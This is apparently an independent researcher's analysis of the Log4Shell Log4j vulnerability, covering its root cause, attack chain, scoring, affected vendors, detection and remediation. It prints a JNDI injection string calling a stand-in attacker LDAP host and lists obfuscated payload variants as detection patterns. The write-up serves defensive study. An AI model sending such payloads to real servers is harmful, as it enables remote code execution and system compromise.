# Log4Shell — CVE-2021-44228

**Apache Log4j 2 Remote Code Execution Vulnerability**

| | |
|---|---|
| **CVE ID** | CVE-2021-44228 |
| **Alias** | Log4Shell |
| **Affected Software** | Apache Log4j 2 (versions 2.0-beta9 through 2.14.1) |
| **Vulnerability Type** | Remote Code Execution (RCE) via JNDI Injection |
| **CVSS v3.1 Score** | 10.0 / 10.0 — Critical |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Discovered By** | Chen Zhaojun, Alibaba Cloud Security Team |
| **Reported to Apache** | November 24, 2021 |
| **Public Disclosure** | December 9, 2021 |
| **CWE Classification** | CWE-20: Improper Input Validation |

---

## 1. Overview

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2, one of the most widely used Java logging libraries in the world. Disclosed on December 9, 2021, it earned the maximum possible CVSS score of 10.0 — an unauthenticated attacker anywhere on the internet could execute arbitrary code on any server running a vulnerable Log4j 2 version simply by sending a single specially crafted string the server would log.

CISA's director described it as one of the most serious vulnerabilities she had seen in her career. Hundreds of millions of devices were estimated to be potentially vulnerable worldwide.

---

## 2. Technical Background

### 2.1 What is Apache Log4j 2?

An open-source Java logging library maintained by the Apache Software Foundation. It became the de facto standard for Java applications and was embedded — often as a transitive dependency developers weren't even aware of — across banking systems, e-commerce platforms, ERP software, security tools, and government systems globally.

### 2.2 What is JNDI?

JNDI (Java Naming and Directory Interface) is a Java API allowing applications to look up objects from external directory services like LDAP, DNS, and RMI. Log4j 2 supported a **Message Lookup Substitution** feature, where syntax like `${env:USER}` would be dynamically resolved at runtime — including `${jndi:...}` lookups. This is the root of the vulnerability.

### 2.3 Root Cause

Log4j 2 performed JNDI lookups on **user-controlled input** with no validation. If an attacker could get any user-controlled value logged — a username, search query, User-Agent header, form field — they could inject a JNDI lookup string forcing the server to connect to an attacker-controlled server, download a malicious Java class, and execute it.

```
${jndi:ldap://attacker.example.com:1389/exploit}
```

When Log4j 2 processes this, it interprets `${jndi:...}` as a lookup directive, initiates an outbound LDAP connection, retrieves a malicious class file, and executes it — fully automatically, no user interaction required.

---

## 3. Attack Chain — Step by Step

| Step | Phase | Description |
|---|---|---|
| 1 | Payload delivery | Attacker injects `${jndi:ldap://attacker.com:1389/a}` into any input the server logs (HTTP headers, login fields, search queries) |
| 2 | Server logs input | The vulnerable Java app passes the input to Log4j 2 for logging, as normal |
| 3 | Lookup parsed | Log4j 2 detects `${jndi:...}` syntax and invokes the JNDI Manager instead of logging plain text |
| 4 | Outbound LDAP connection | The vulnerable server connects **outbound** to the attacker's LDAP server — bypassing most inbound firewall rules |
| 5 | LDAP responds | Attacker's LDAP server returns a reference to a malicious Java class on a secondary HTTP server |
| 6 | Class downloaded | Log4j 2's JNDI Manager follows the reference and downloads the malicious `.class` file |
| 7 | Code execution | The JVM loads and runs the class with the same privileges as the Java process |
| 8 | Post-exploitation | Backdoor/RAT install, ransomware, cryptominer, credential theft, lateral movement |

The defining characteristic: exploitation requires only network access to any port the application listens on. No credentials, no prior access, no user interaction.

---

## 4. CVSS v3.1 Score Breakdown

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

| Metric | Value | Meaning |
|---|---|---|
| Attack Vector | `AV:N` (Network) | Exploitable remotely over the internet |
| Attack Complexity | `AC:L` (Low) | No special conditions or target-specific knowledge needed |
| Privileges Required | `PR:N` (None) | No authentication needed |
| User Interaction | `UI:N` (None) | Fully automated, victim does nothing |
| Scope | `S:C` (Changed) | Can impact resources beyond the vulnerable component (e.g. host OS) |
| Confidentiality | `C:H` (High) | Full read access to all data |
| Integrity | `I:H` (High) | Full write access — modify, corrupt, delete |
| Availability | `A:H` (High) | Full disruption — crash, ransomware, DoS |

All eight metrics at maximum severity simultaneously — an extremely rare combination, explaining the perfect 10.0 score.

---

## 5. Affected Systems & Scale

**Vulnerable versions:** Log4j 2.0-beta9 through 2.14.1 — in mainstream use for ~9 years before discovery.

**Confirmed affected (sourced from TechCrunch, SecurityWeek, BleepingComputer, Dec 2021):**

- **Apple** — iCloud web services
- **Amazon** — multiple AWS services
- **Microsoft** — Minecraft Java Edition
- **Cisco** — Webex, Identity Services Engine, others
- **VMware** — ~40 products including Horizon, vCenter Server
- **IBM** — QRadar SIEM, SPSS Statistics
- **Cloudflare, Twitter, Baidu, Steam** — confirmed affected, rapid mitigation
- **NSA** — GHIDRA reverse engineering tool
- **Palo Alto Networks** — Panorama
- **ElasticSearch / Apache Solr**

**Statistical impact (Tenable Research, 2022):**

| Statistic | Detail |
|---|---|
| 500M+ | Security tests conducted by Tenable to measure exposure |
| 72% | Organizations still vulnerable as of October 1, 2022 |
| 53% | Organizations vulnerable during the full study period |
| 1 in 10 | Assets vulnerable in December 2021 |
| 33,000 hrs | Spent by one US federal department on Log4j response alone |

---

## 6. Threat Actor Activity

### Nation-state actors
- **Iran-sponsored actors** — CISA/FBI formally attributed exploitation against US critical infrastructure
- **Chinese state-sponsored groups** — Mandiant tracked 30 active attack campaigns
- **North Korean and Russian groups** — observed integrating Log4Shell into targeted operations

### Cybercriminal groups
Mandiant detected **11 different malware families** deployed via Log4Shell exploitation in Q1 2022 — ransomware, cryptominers, credential stealers, persistent RATs.

### Timeline

| Date | Event |
|---|---|
| Nov 24, 2021 | Privately reported to Apache by Alibaba Cloud Security |
| Dec 1, 2021 | Cloudflare reports first evidence of exploitation — before disclosure |
| Dec 6, 2021 | Apache releases 2.15.0 emergency patch |
| Dec 9, 2021 | Public disclosure. Mass exploitation begins within hours |
| Dec 10, 2021 | CISA emergency directive. Apple, Microsoft, VMware, Cisco advisories |
| Dec 14, 2021 | Log4j 2.16.0 — disables JNDI entirely (2.15.0 was insufficient) |
| Dec 18, 2021 | Log4j 2.17.0 — fixes additional DoS vuln (CVE-2021-45105) |
| Oct 2022 | Tenable reports 72% of orgs still vulnerable — 10 months later |

---

## 7. Detection Methods

### Log-based IOCs

```
${jndi:ldap://
${jndi:rmi://
${jndi:dns://
${${lower:j}ndi:
${${::-j}${::-n}${::-d}${::-i}:
```

The last two are obfuscation variants using Log4j's own nested substitution feature to bypass simple string matching.

### Network-based detection
- Unusual outbound LDAP connections (port 389/636) from app servers
- Unexpected outbound RMI connections (port 1099)
- Unexpected outbound DNS queries to unknown domains right after an inbound HTTP request
- Outbound HTTP/HTTPS to unusual IPs (the class-download phase)

### Tools
- [CISA Log4j Scanner](https://github.com/cisagov/log4j-scanner)
- Nmap NSE: `nmap --script log4shell -p <port> <target>`
- Canary tokens for self-monitoring
- SIEM regex rules across all log sources for `${jndi:` variants

---

## 8. Remediation

| Version | Fix |
|---|---|
| 2.15.0 | First patch — disabled JNDI by default (later bypassed, CVE-2021-45046) |
| 2.16.0 | Removed JNDI support entirely — recommended over 2.15.0 |
| 2.17.0 | Fixed additional DoS issue — recommended stable version |
| 2.3.1 / 2.12.3 | Backported fixes for Java 6/7 environments |

**Immediate workarounds (if patching isn't possible yet):**
```bash
-Dlog4j2.formatMsgNoLookups=true          # JVM system property
LOG4J_FORMAT_MSG_NO_LOOKUPS=true          # Environment variable
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```
Also: block outbound LDAP/RMI/DNS from app servers at the firewall, deploy WAF rules for `${jndi:` patterns.

**Long-term:**
- Software Bill of Materials (SBOM) to track open-source dependency usage
- Software Composition Analysis (SCA) tooling
- A predefined vulnerability response playbook
- Restrict outbound connections from app servers to required destinations only

---

## 9. MITRE ATT&CK Mapping

| Technique | Tactic | Application |
|---|---|---|
| T1190 | Initial Access | Exploit Public-Facing Application — any logging Java app |
| T1059 | Execution | Command and Scripting Interpreter — shell commands via loaded class |
| T1105 | Execution / Lateral Movement | Ingress Tool Transfer — malware/RAT download post-RCE |
| T1133 | Persistence | External Remote Services — backdoor install |
| T1071 | Command & Control | Application Layer Protocol — HTTP/DNS blending with legit traffic |
| T1486 | Impact | Data Encrypted for Impact — ransomware via this initial vector |
| T1078 | Credential Access | Valid Accounts — stolen creds reused for lateral movement |

---

## 10. Key Takeaways

- A single open-source library vulnerability simultaneously affected hundreds of millions of systems across every sector globally
- CVSS 10.0 means: any attacker, anywhere, zero authentication, full compromise
- Exploitation began **before** public disclosure and reached mass-scale within hours of the CVE being published
- Nation-state actors from Iran, China, North Korea, and Russia all weaponized it within days
- 72% of organizations remained vulnerable 10 months later — remediation at scale is a sustained effort, not a one-time patch
- Software supply chain visibility (SBOM) is now a national security requirement

---

## References

1. NIST National Vulnerability Database — [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
2. CISA — [Alert AA21-356A](https://www.cisa.gov): Mitigating Log4Shell and Other Log4j-Related Vulnerabilities
3. US Cyber Safety Review Board — [Review of the December 2021 Log4j Event](https://www.cisa.gov/sites/default/files/publications/CSRB-Report-on-Log4-July-11-2022_508.pdf)
4. Tenable Research — 72% of Organizations Remain Vulnerable to Log4Shell, Dec 2022
5. Mandiant — Trending Evil Q1 2022 Report
6. LunaSec — [Log4Shell: RCE 0-day exploit found in log4j](https://www.lunasec.io/docs/blog/log4shell-live-patch-technical/)
7. Apache Software Foundation — [Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
8. Sophos — Inside the code: How the Log4Shell exploit works
9. TechCrunch — Apple, iCloud, Twitter and Minecraft vulnerable to ubiquitous zero-day flaw
10. MITRE ATT&CK Framework — [attack.mitre.org](https://attack.mitre.org)

---

*Research conducted by Shah Armaan Amin as independent CVE analysis, June 2026.*
